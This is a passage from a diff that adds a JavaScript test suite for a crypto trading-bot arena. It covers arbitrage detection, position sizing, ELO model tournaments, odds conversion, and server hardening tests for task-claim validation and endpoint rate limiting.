@@ -1,0 +1,2313 @@
+#!/usr/bin/env node
+
+/**
+ * TRADE ARENA - Unit & Integration Tests
+ * Run with: npm test
+ */
+
+const crypto = require("crypto");
+const { TradingEngine } = require("./public/trading-engine.js");
+const {
+  SecurityHelper,
+  ArbitrageAnalyzer,
+  FlashLoanSimulator,
+} = require("./public/contract-helpers.js");
+const {
+  CrucibleTest,
+  runCrucibleTest,
+  calculateRSI,
+  calculateATR,
+  calculateSMA,
+  classifyRegime,
+  validateAllRegimes,
+} = require("./public/crucible-test.js");
+const {
+  ARENA_COMPETITION,
+  BOT_AI_MODELS,
+  MODEL_SELECTION,
+  callAIModel,
+  getModelConfig,
+} = require("./public/multi-ai-arena.js");
+const { TRADE_OLYMPICS } = require("./public/trade-olympics.js");
+const { calculateSlippage } = require("./public/real-wallet.js");
+const { CrucibleRealTrading } = require("./public/crucible-real-trading.js");
+const {
+  createRiskState,
+  recordOpportunityResult,
+  getRiskAdjustment,
+} = require("./public/arb-risk-engine.js");
+const {
+  americanToProbability,
+  removeVig,
+  findSportsPredictionEdges,
+} = require("./public/sports-odds-arb.js");
+const {
+  calculateFlashLoanArb,
+  scanCrossDexFlashArb,
+} = require("./public/cross-dex-arb-scanner.js");
+
+const tests = [];
+let currentSuite = "";
+let testFailures = 0;
+
+const expect = (value) => ({
+  toBe: (expected) => {
+    if (value !== expected)
+      throw new Error(`Expected ${expected}, got ${value}`);
+  },
+  toEqual: (expected) => {
+    if (JSON.stringify(value) !== JSON.stringify(expected)) {
+      throw new Error(
+        `Expected ${JSON.stringify(expected)}, got ${JSON.stringify(value)}`,
+      );
+    }
+  },
+  toBeGreaterThan: (expected) => {
+    if (value <= expected)
+      throw new Error(`Expected > ${expected}, got ${value}`);
+  },
+  toBeGreaterThanOrEqual: (expected) => {
+    if (value < expected)
+      throw new Error(`Expected >= ${expected}, got ${value}`);
+  },
+  toBeLessThan: (expected) => {
+    if (value >= expected)
+      throw new Error(`Expected < ${expected}, got ${value}`);
+  },
+  toBeLessThanOrEqual: (expected) => {
+    if (value > expected)
+      throw new Error(`Expected <= ${expected}, got ${value}`);
+  },
+  toContain: (expected) => {
+    if (!value.includes(expected))
+      throw new Error(`Expected ${value} to contain ${expected}`);
+  },
+  toMatch: (pattern) => {
+    if (!pattern.test(value))
+      throw new Error(`Expected ${value} to match ${pattern}`);
+  },
+});
+
+const describe = (name, fn) => {
+  currentSuite = name;
+  fn();
+};
+
+const it = (name, fn) => {
+  tests.push({ suite: currentSuite, name, fn });
+};
+
+describe("Trading Engine - Core Logic", () => {
+  it("loads the real TradingEngine module", () => {
+    const engine = new TradingEngine();
+    expect(Array.isArray(engine.bots)).toBe(true);
+    expect(engine.riskLimits.maxOpportunityAgeMs).toBe(45000);
+  });
+
+  it("filters stablecoins from market pairs", () => {
+    const engine = new TradingEngine();
+    const pairs = [
+      { token: "WETH" },
+      { token: "USDC" },
+      { token: "ARB" },
+      { token: "DAI" },
+    ];
+    expect(engine.filterStablecoins(pairs).map((pair) => pair.token)).toEqual([
+      "WETH",
+      "ARB",
+    ]);
+  });
+
+  it("detects arbitrage opportunities with deterministic exchange prices", async () => {
+    const engine = new TradingEngine();
+    engine.fetchPrice = async (_token, exchange) =>
+      exchange === "uniswap" ? 100 : 101;
+
+    const opportunities = await engine.detectArbitrageOpportunities([
+      { token: "WETH", volume: 100000, volatility: 2 },
+      { token: "USDC", volume: 100000, volatility: 1 },
+    ]);
+
+    expect(opportunities.length).toBe(1);
+    expect(opportunities[0].token).toBe("WETH");
+    expect(opportunities[0].profitMargin).toBeGreaterThan(0.3);
+  });
+
+  it("calculates risk scores inside 0-100", () => {
+    const engine = new TradingEngine();
+    const risk = engine.calculateRiskScore(5, 0.5);
+    expect(risk).toBeGreaterThanOrEqual(0);
+    expect(risk).toBeLessThanOrEqual(100);
+  });
+
+  it("generates unique IDs", () => {
+    const engine = new TradingEngine();
+    expect(engine.generateId() === engine.generateId()).toBe(false);
+  });
+});
+
+describe("Task Claim Security - Sentinel Hardening", () => {
+  it("enforces whitelisting and duplicate prevention on task claim endpoints", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const testAddress = "0x9F407b7f793555c35c33aC64bd6901759470736D";
+      const validToken = "test-secret-key-123";
+
+      // 1. /api/tasks/claim - Reject invalid/non-whitelisted taskId
+      const resInvalidTask = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "malicious_task_999",
+          reward: 10,
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resInvalidTask.status).toBe(400);
+      const dataInvalidTask = await resInvalidTask.json();
+      expect(dataInvalidTask.success).toBe(false);
+      expect(dataInvalidTask.error).toBe("Invalid or unauthorized taskId requested");
+
+      // 2. /api/tasks/claim - Accept valid, whitelisted taskId
+      const resValidTask = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "follow_twitter",
+          reward: 10,
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resValidTask.status).toBe(200);
+      const dataValidTask = await resValidTask.json();
+      expect(dataValidTask.success).toBe(true);
+
+      // 3. /api/tasks/claim - Reject duplicate taskId claim
+      const resDupTask = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "follow_twitter",
+          reward: 10,
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resDupTask.status).toBe(429);
+      const dataDupTask = await resDupTask.json();
+      expect(dataDupTask.success).toBe(false);
+      expect(dataDupTask.error).toBe("Task already claimed for this address");
+
+      // 4. /api/v1/payouts/claim - Reject invalid/non-whitelisted taskId
+      const resInvalidPayout = await fetch(`http://localhost:${port}/api/v1/payouts/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "malicious_task_999",
+          proofOfWork: "some-proof-data",
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resInvalidPayout.status).toBe(400);
+      const dataInvalidPayout = await resInvalidPayout.json();
+      expect(dataInvalidPayout.error).toBe("Invalid or unauthorized taskId requested");
+
+      // 5. /api/v1/payouts/claim - Reject duplicate taskId claim (shared in app.locals)
+      const resDupPayout = await fetch(`http://localhost:${port}/api/v1/payouts/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "follow_twitter",
+          proofOfWork: "some-proof-data",
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resDupPayout.status).toBe(429);
+      const dataDupPayout = await resDupPayout.json();
+      expect(dataDupPayout.error).toBe("Task already claimed for this address");
+
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+    }
+  });
+
+  it("rejects task claims with incorrect or spoofed reward amounts (Integrity validation)", async () => {
+    const originalPort = process.env.PORT;
+    const originalSecret = process.env.TASK_CLAIM_SECRET;
+    process.env.PORT = "0";
+    process.env.TASK_CLAIM_SECRET = "test-secret-key-123";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const testAddress = "0x9F407b7f793555c35c33aC64bd6901759470736D";
+      const validToken = "test-secret-key-123";
+
+      // Try to submit follow_twitter with reward 100 instead of 10
+      const resSpoofedReward = await fetch(`http://localhost:${port}/api/tasks/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          taskId: "follow_twitter",
+          reward: 100, // Spoofed (should be 10)
+          userAddress: testAddress,
+          validationToken: validToken
+        })
+      });
+      expect(resSpoofedReward.status).toBe(400);
+      const dataSpoofedReward = await resSpoofedReward.json();
+      expect(dataSpoofedReward.success).toBe(false);
+      expect(dataSpoofedReward.error).toBe("Invalid or incorrect reward for this task");
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+      process.env.TASK_CLAIM_SECRET = originalSecret;
+    }
+  });
+});
+
+describe("Trading Engine - Volatility & Sizing", () => {
+  it("calculates volatility from price history", () => {
+    const engine = new TradingEngine();
+    const analysis = engine.analyzeVolatility([
+      2500, 2510, 2520, 2515, 2525, 2530,
+    ]);
+    expect(analysis.current !== undefined).toBe(true);
+    expect(analysis.forecast1h !== undefined).toBe(true);
+  });
+
+  it("classifies low and high volatility", () => {
+    const engine = new TradingEngine();
+    expect(engine.analyzeVolatility([2500, 2501, 2502, 2503, 2504]).trend).toBe(
+      "LOW",
+    );
+    expect(engine.analyzeVolatility([2500, 2700, 2300, 2800, 2200]).trend).toBe(
+      "HIGH",
+    );
+  });
+
+  it("reduces position size in high volatility", () => {
+    const engine = new TradingEngine();
+    const lowVol = engine.calculatePositionSize(10, 2, 10);
+    const highVol = engine.calculatePositionSize(10, 8, 10);
+    expect(parseFloat(lowVol.size)).toBeGreaterThan(parseFloat(highVol.size));
+    expect(lowVol.riskReward).toBe(2.5);
+  });
+});
+
+describe("Trading Engine - Signal & Execution", () => {
+  it("generates buy signals for oversold conditions", () => {
+    const engine = new TradingEngine();
+    const signal = engine.generateTradeSignal({
+      price: 2500,
+      volume: 100000,
+      rsi: 25,
+      macd: { histogram: 0.5, prevHistogram: 0.4 },
+      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
+    });
+    expect(signal.action).toBe("BUY");
+  });
+
+  it("generates sell signals for overbought conditions", () => {
+    const engine = new TradingEngine();
+    const signal = engine.generateTradeSignal({
+      price: 2500,
+      volume: 100000,
+      rsi: 85,
+      macd: { histogram: -0.5, prevHistogram: -0.4 },
+      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
+    });
+    expect(signal.action).toBe("SELL");
+  });
+
+  it("records profitable paper trade execution", async () => {
+    const engine = new TradingEngine();
+    const bot = {
+      id: engine.generateId(),
+      name: "Test Bot",
+      amount: 10,
+      risk: "Moderate (5x leverage)",
+    };
+    const trade = await engine.executeTrade(bot, {
+      type: "ARBITRAGE",
+      profitMargin: 0.8,
+      volatility: 2,
+      buyPrice: 2500,
+      sellPrice: 2525,
+      timestamp: Date.now(),
+      ttl: 45000,
+    });
+
+    expect(trade.botId).toBe(bot.id);
+    expect(trade.status).toBe("CLOSED");
+    expect(Number(trade.profit)).toBeGreaterThan(0);
+  });
+
+  it("expires stale opportunities before execution", async () => {
+    const engine = new TradingEngine();
+    const bot = {
+      id: engine.generateId(),
+      name: "Expiry Bot",
+      amount: 10,
+      risk: "Moderate (5x leverage)",
+    };
+    const trade = await engine.executeTrade(bot, {
+      type: "ARBITRAGE",
+      profitMargin: 1,
+      volatility: 2,
+      timestamp: Date.now() - 60000,
+      ttl: 45000,
+    });
+
+    expect(trade.status).toBe("EXPIRED");
+    expect(trade.profit).toBe(0);
+  });
+});
+
+describe("Contract Helpers - Security & Simulation", () => {
+  it("identifies stablecoins", () => {
+    expect(SecurityHelper.isStablecoin("USDC")).toBe(true);
+    expect(SecurityHelper.isStablecoin("USDT")).toBe(true);
+    expect(SecurityHelper.isStablecoin("DAI")).toBe(true);
+    expect(SecurityHelper.isStablecoin("ETH")).toBe(false);
+  });
+
+  it("assesses MEV risk and recommendations", () => {
+    expect(
+      SecurityHelper.analyzeMEVRisk({
+        amountIn: 50,
+        volatility: 8,
+        liquidity: 50000,
+      }).recommendation,
+    ).toBe("WAIT");
+    expect(
+      SecurityHelper.analyzeMEVRisk({
+        amountIn: 1,
+        volatility: 2,
+        liquidity: 5000000,
+      }).recommendation,
+    ).toBe("PROCEED");
+  });
+
+  it("estimates higher slippage for larger or lower-liquidity trades", () => {
+    const small = SecurityHelper.estimateSlippage(1, 1000000, 3);
+    const large = SecurityHelper.estimateSlippage(100, 1000000, 3);
+    const lowLiq = SecurityHelper.estimateSlippage(10, 100000, 3);
+    const highLiq = SecurityHelper.estimateSlippage(10, 10000000, 3);
+
+    expect(large).toBeGreaterThan(small);
+    expect(lowLiq).toBeGreaterThan(highLiq);
+  });
+
+  it("validates contract interaction inputs", () => {
+    const valid = SecurityHelper.validateContractInteraction(
+      "0x4200000000000000000000000000000000000006",
+      "transfer",
+      [],
+    );
+    const invalid = SecurityHelper.validateContractInteraction(
+      "not-an-address",
+      "transfer",
+      [],
+    );
+
+    expect(valid.valid).toBe(true);
+    expect(invalid.valid).toBe(false);
+  });
+});
+
+describe("Arbitrage & Flash Loan Simulators", () => {
+  it("identifies viable arbitrage after fees", () => {
+    const profitable = ArbitrageAnalyzer.calculateArbitrage(
+      2500,
+      2700,
+      10000,
+      1,
+    );
+    const unprofitable = ArbitrageAnalyzer.calculateArbitrage(
+      2500,
+      2501,
+      10000,
+      1,
+    );
+
+    expect(profitable.isViable).toBe(true);
+    expect(Number(unprofitable.netProfit)).toBeLessThan(0);
+  });
+
+  it("detects triangular arbitrage", () => {
+    const arb = ArbitrageAnalyzer.findTriangularArbitrage({
+      "ETH/USD": 2500,
+      "USD/USDC": 1,
+      "USDC/ETH": 0.000401,
+    });
+    expect(arb.opportunity).toBe(true);
+  });
+
+  it("calculates flash loan liquidation and sandwich metrics", () => {
+    const liquidation = FlashLoanSimulator.simulateLiquidation(100, 50, 2500);
+    const sandwich = FlashLoanSimulator.simulateSandwich(100, 50, 100);
+
+    expect(liquidation.flashLoanFee).toBe((100 * 0.0009).toFixed(4));
+    expect(Number(liquidation.profit)).toBeGreaterThan(0);
+    expect(Number(sandwich.totalProfit)).toBeGreaterThan(0);
+  });
+});
+
+describe("Crucible Regime Coverage", () => {
+  it("calculates RSI, ATR, and SMA indicators", () => {
+    const closes = [
+      101, 103, 102, 104, 106, 105, 107, 109, 108, 110, 111, 109, 108, 107, 106,
+    ];
+    const highs = [
+      102, 104, 103, 105, 107, 106, 108, 110, 109, 111, 112, 110, 109, 108, 107,
+    ];
+    const lows = [
+      99, 101, 100, 102, 104, 103, 105, 107, 105, 108, 109, 107, 106, 105, 104,
+    ];
+
+    expect(calculateRSI(closes, 14)).toBeGreaterThanOrEqual(0);
+    expect(calculateRSI(closes, 14)).toBeLessThanOrEqual(100);
+    expect(calculateATR(highs, lows, closes, 14)).toBeGreaterThan(0);
+    expect(calculateSMA(closes, 5)).toBe(108.2);
+  });
+
+  it("classifies every required market regime", () => {
+    expect(classifyRegime(65, 2, 110, 105)).toBe("BULL");
+    expect(classifyRegime(35, 2, 100, 105)).toBe("BEAR");
+    expect(classifyRegime(50, 6, 105, 105)).toBe("HIGH_VOL");
+    expect(classifyRegime(50, 2, 105, 105)).toBe("CHOP");
+  });
+
+  it("passes the all-regime Crucible coverage validator", () => {
+    const coverage = validateAllRegimes();
+    expect(coverage.passed).toBe(true);
+    expect(coverage.regimes.sort()).toEqual(
+      ["BEAR", "BULL", "CHOP", "HIGH_VOL"].sort(),
+    );
+  });
+
+  it("runs a fast Crucible paper test with strict risk accounting", async () => {
+    CrucibleTest.config.verbose = false;
+    CrucibleTest.config.verifyResults = true;
+    await runCrucibleTest(2, 0);
+
+    expect(CrucibleTest.trades.length).toBe(2);
+    CrucibleTest.trades.forEach((trade) => {
+      expect(trade.verified).toBe(true);
+      expect([30, -10, 0]).toContain(trade.pnl);
+    });
+  });
+});
+
+describe("Self-Evolving ELO Tournament System", () => {
+  const tournamentModels = [
+    { name: "ALPHA", provider: "test", elo: 1200 },
+    { name: "BETA", provider: "test", elo: 1200 },
+    { name: "GAMMA", provider: "test", elo: 1200 },
+  ];
+
+  it("initializes brackets and normalized global weights", () => {
+    const summary = TRADE_OLYMPICS.reset({
+      models: tournamentModels,
+      persist: false,
+      silent: true,
+    });
+
+    expect(summary.totalModels).toBe(3);
+    expect(summary.totalBrackets).toBe(
+      TRADE_OLYMPICS.METHODS.length *
+        TRADE_OLYMPICS.TOKENS.length *
+        TRADE_OLYMPICS.EDGE_TIERS.length,
+    );
+
+    const assignment = TRADE_OLYMPICS.getModelForTrade("ARBITRAGE", "BTC", 2);
+    expect(assignment.isOlympics).toBe(true);
+    expect(["ALPHA", "BETA", "GAMMA"].includes(assignment.model)).toBe(true);
+
+    const weights = TRADE_OLYMPICS.getGlobalWeights();
+    const totalWeight = weights.reduce((sum, item) => sum + item.weight, 0);
+
+    expect(weights.length).toBe(3);
+    expect(totalWeight).toBeGreaterThan(0.999);
+    expect(totalWeight).toBeLessThan(1.001);
+  });
+
+  it("evolves ELO standings and global weights after tournaments", () => {
+    TRADE_OLYMPICS.reset({
+      models: tournamentModels,
+      persist: false,
+      silent: true,
+    });
+
+    const tournament = TRADE_OLYMPICS.runEloTournament({
+      rounds: 2,
+      random: () => 0.9,
+    });
+    const leaderboard = TRADE_OLYMPICS.getEloLeaderboard();
+    const weights = TRADE_OLYMPICS.getGlobalWeights();
+
+    expect(tournament.matches.length).toBe(6);
+    expect(TRADE_OLYMPICS.MATCH_LOG.length).toBe(6);
+    expect(leaderboard[0].elo).toBeGreaterThan(1200);
+    expect(weights[0].model).toBe(leaderboard[0].model);
+    expect(weights[0].weight).toBeGreaterThan(
+      weights[weights.length - 1].weight,
+    );
+  });
+
+  it("records trade matchups into bracket stats and ELO ratings", () => {
+    TRADE_OLYMPICS.reset({
+      models: tournamentModels.slice(0, 2),
+      persist: false,
+      silent: true,
+    });
+
+    const assignment = TRADE_OLYMPICS.getModelForTrade("SPOT LONG", "ETH", 2);
+    const opponent = assignment.model === "ALPHA" ? "BETA" : "ALPHA";
+    const beforeElo = TRADE_OLYMPICS.STANDINGS[assignment.model].elo;
+    const entry = TRADE_OLYMPICS.recordTrade(assignment.bracket, {
+      outcome: "WIN",
+      pnl: 25,
+      edge: 2,
+      model: assignment.model,
+      opponentModel: opponent,
+      opponentPnl: -10,
+    });
+
+    expect(entry.outcome).toBe("WIN");
+    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].trades).toBe(1);
+    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].wins).toBe(1);
+    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].totalTrades).toBe(1);
+    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].elo).toBeGreaterThan(
+      beforeElo,
+    );
+  });
+});
+
+describe("Multi-AI Arena Global Weights", () => {
+  it("loads ELO model metadata for weighted model selection", () => {
+    expect(getModelConfig("gpt-5-turbo").elo).toBe(1400);
+    expect(getModelConfig("qwen-72b").elo).toBe(1090);
+
+    const originalRandom = Math.random;
+    Math.random = () => 0;
+    try {
+      expect(MODEL_SELECTION.eloWeighted()).toBe("gpt-5-turbo");
+    } finally {
+      Math.random = originalRandom;
+    }
+  });
+
+  it("records model outcomes into arena competition stats", async () => {
+    ARENA_COMPETITION.modelStats = {};
+    Object.keys(BOT_AI_MODELS).forEach((botId) => delete BOT_AI_MODELS[botId]);
+
+    const originalRandom = Math.random;
+    Math.random = () => 0.01;
+    try {
+      const decision = await callAIModel(
+        [
+          {
+            symbol: "ETH",
+            current_price: 2500,
+            price_change_percentage_24h: 1,
+            total_volume: 1000000000,
+          },
+        ],
+        100,
+        42,
+      );
+
+      const stats = ARENA_COMPETITION.modelStats[decision.aiModel];
+      expect(stats.baseTrades).toBe(1);
+      expect(stats.wins).toBe(1);
+      expect(stats.eloRating).toBe(getModelConfig(decision.aiModel).elo);
+    } finally {
+      Math.random = originalRandom;
+    }
+  });
+});
+
+describe("Server Endpoint Rate Limiting - Sentinel Hardening", () => {
+  it("enforces strict rate limiting on the /api/user/login endpoint", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    // Back up users.json to ensure no database pollution
+    const fs = require('fs');
+    const path = require('path');
+    const usersFilePath = path.join(__dirname, 'users.json');
+    let usersBackup = null;
+    try {
+      if (fs.existsSync(usersFilePath)) {
+        usersBackup = fs.readFileSync(usersFilePath, 'utf8');
+      }
+    } catch (e) {}
+
+    // Clear require cache for server.js to ensure a fresh load
+    delete require.cache[require.resolve("./server.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // Make 15 successful or validation-failed login requests (max is 15)
+      // The 16th request should be blocked with 429
+      let lastStatus = 0;
+      for (let i = 0; i < 16; i++) {
+        const res = await fetch(`http://localhost:${port}/api/user/login`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: "test-rate-limit@example.com" })
+        });
+        lastStatus = res.status;
+        if (lastStatus === 429) {
+          break;
+        }
+      }
+      expect(lastStatus).toBe(429);
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+
+      // Restore users.json backup
+      try {
+        if (usersBackup !== null) {
+          fs.writeFileSync(usersFilePath, usersBackup, 'utf8');
+        } else if (fs.existsSync(usersFilePath)) {
+          fs.unlinkSync(usersFilePath);
+        }
+      } catch (e) {}
+    }
+  });
+
+  it("enforces strict rate limiting on the /api/execute/swap endpoint", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      let lastStatus = 0;
+      for (let i = 0; i < 11; i++) {
+        const res = await fetch(`http://localhost:${port}/api/execute/swap`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            fromToken: "USDC",
+            toToken: "WETH",
+            amount: 10,
+            slippage: 0.005
+          })
+        });
+        lastStatus = res.status;
+        if (lastStatus === 429) {
+          break;
+        }
+      }
+      expect(lastStatus).toBe(429);
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+
+  it("evicts the oldest IP record when MAX_TRACKED_IPS threshold is reached", async () => {
+    delete require.cache[require.resolve("./server.js")];
+    const { app: serverApp, server } = require("./server.js");
+    const rateLimitMap = serverApp.rateLimitMap;
+    const checkRateLimit = serverApp.checkRateLimit;
+    const MAX_TRACKED_IPS = serverApp.MAX_TRACKED_IPS;
+
+    // Reset rateLimitMap for clean test
+    rateLimitMap.clear();
+
+    const now = Date.now();
+    // Pre-populate rateLimitMap with MAX_TRACKED_IPS dummy entries
+    // Since insertion order is preserved in ES6 Map, '1.1.1.1' will be the oldest
+    rateLimitMap.set('1.1.1.1', { count: 1, resetAt: now + 900000 });
+    for (let i = 2; i <= MAX_TRACKED_IPS; i++) {
+      rateLimitMap.set(`1.1.1.${i}`, { count: 1, resetAt: now + 900000 });
+    }
+
+    expect(rateLimitMap.size).toBe(MAX_TRACKED_IPS);
+    expect(rateLimitMap.has('1.1.1.1')).toBe(true);
+
+    // Call checkRateLimit with a brand new IP address (e.g. '2.2.2.2')
+    // This should trigger oldest-first eviction (removing '1.1.1.1' and adding '2.2.2.2')
+    const allowed = checkRateLimit('2.2.2.2');
+
+    expect(allowed).toBe(true);
+    expect(rateLimitMap.size).toBe(MAX_TRACKED_IPS);
+    expect(rateLimitMap.has('1.1.1.1')).toBe(false); // Oldest IP evicted
+    expect(rateLimitMap.has('2.2.2.2')).toBe(true);  // New IP successfully tracked
+  });
+});
+
+describe("Live-Data Trade Logic Safety & Self-Correction", () => {
+  it("resets real-trading session state before each run", async () => {
+    await CrucibleRealTrading.init({ startingBalance: 75, enableAILearning: true });
+    CrucibleRealTrading.tradeState.wins = 99;
+    CrucibleRealTrading.aiState.riskMultiplier = 0.5;
+    CrucibleRealTrading.aiState.adjustments.push({ reason: "test" });
+
+    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });
+
+    expect(CrucibleRealTrading.tradeState.currentBalance).toBe(50);
+    expect(CrucibleRealTrading.tradeState.wins).toBe(0);
+    expect(CrucibleRealTrading.tradeState.losses).toBe(0);
+    expect(CrucibleRealTrading.aiState.riskMultiplier).toBe(1);
+    expect(CrucibleRealTrading.aiState.adjustments.length).toBe(0);
+  });
+
+  it("tracks bad trades and self-corrects risk exposure", async () => {
+    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });
+
+    const crypto = { symbol: "ETH" };
+    const indicators = {
+      currentPrice: 2500,
+      volatility: 2,
+      rsi: 72,
+      momentum: -1.2,
+      trendStrength: -2,
+    };
+    const signals = {
+      strategy: "MOMENTUM_SHORT",
+      direction: "SHORT",
+      confidence: 80,
+    };
+
+    const originalRandom = Math.random;
+    Math.random = () => 0.99; // force stop-loss path
+    try {
+      for (let i = 0; i < 4; i++) {
+        const size = CrucibleRealTrading.calculatePositionSize(indicators, signals);
+        await CrucibleRealTrading.executeTrade(crypto, indicators, signals, size);
+      }
+    } finally {
+      Math.random = originalRandom;
+    }
+
+    const perf = CrucibleRealTrading.aiState.strategyPerformance.MOMENTUM_SHORT;
+    expect(perf.losses).toBe(4);
+    expect(perf.consecutiveLosses).toBe(4);
+    expect(CrucibleRealTrading.aiState.entryAdaptation).toBeLessThan(1);
+    expect(CrucibleRealTrading.aiState.riskMultiplier).toBeLessThan(1);
+    expect(CrucibleRealTrading.aiState.adjustments.length).toBeGreaterThan(0);
+    expect(CrucibleRealTrading.aiState.adjustments.at(-1).reason).toBe(
+      "underperforming_strategy",
+    );
+  });
+
+  it("keeps drawdown-based position sizing non-negative", async () => {
+    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });
+    CrucibleRealTrading.tradeState.maxDrawdownPercent = 40;
+
+    const size = CrucibleRealTrading.calculatePositionSize(
+      { volatility: 6 },
+      { confidence: 80 },
+    );
+
+    expect(size).toBeGreaterThanOrEqual(0);
+    expect(size).toBeLessThanOrEqual(CrucibleRealTrading.tradeState.equity * 0.5);
+  });
+
+  it("caps live wallet slippage estimates before any order is sent", () => {
+    const slippage = calculateSlippage(1000, 25, "PERP SHORT");
+
+    expect(Number(slippage.percent)).toBeLessThanOrEqual(2);
+    expect(slippage.method).toBe("PERP SHORT");
+  });
+});
+
+describe("Cross-Market Arbitrage Dry Run Scanners", () => {
+  it("converts odds, removes vig, and finds sports prediction-market edge", () => {
+    expect(Number(americanToProbability(-150).toFixed(4))).toBe(0.6);
+
+    const fair = removeVig([
+      { name: "Team A", price: -150 },
+      { name: "Team B", price: 130 },
+    ]);
+    const fairTotal = fair.reduce((sum, outcome) => sum + outcome.fairProbability, 0);
+    expect(fairTotal).toBeGreaterThan(0.999);
+    expect(fairTotal).toBeLessThan(1.001);
+
+    const riskState = createRiskState({ minNetEdge: 0.03, minNetProfitUSD: 1 });
+    const opportunities = findSportsPredictionEdges({
+      riskState,
+      sportsbookEvents: [
+        {
+          id: "game-1",
+          sport_key: "basketball_nba",
+          home_team: "Team A",
+          away_team: "Team B",
+          bookmakers: [
+            {
+              key: "sharp",
+              markets: [
+                {
+                  key: "h2h",
+                  outcomes: [
+                    { name: "Team A", price: -160 },
+                    { name: "Team B", price: 140 },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+      predictionMarkets: [
+        {
+          eventId: "game-1",
+          outcome: "Team A",
+          yesPrice: 0.54,
+          noPrice: 0.47,
+          liquidityUSD: 5000,
+        },
+      ],
+      config: { minNetEdge: 0.03, minLiquidityUSD: 1000, maxSizeUSD: 100 },
+    });
+
+    expect(opportunities.length).toBe(1);
+    expect(opportunities[0].side).toBe("YES");
+    expect(opportunities[0].status).toBe("CANDIDATE");
+    expect(opportunities[0].netEdge).toBeGreaterThan(0.03);
+    expect(opportunities[0].executionMode).toBe("PREFUNDED_USDC");
+  });
+
+  it("calculates viable cross-DEX flash-loan arbitrage after all costs", async () => {
+    const economics = calculateFlashLoanArb({
+      borrowAmountUSD: 10000,
+      buyQuote: { amountOut: 5, slippageUSD: 1 },
+      sellQuote: { amountOut: 10045, slippageUSD: 1 },
+      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
+    });
+
+    expect(economics.netProfitUSD).toBeGreaterThan(10);
+    expect(economics.isViable).toBe(true);
+
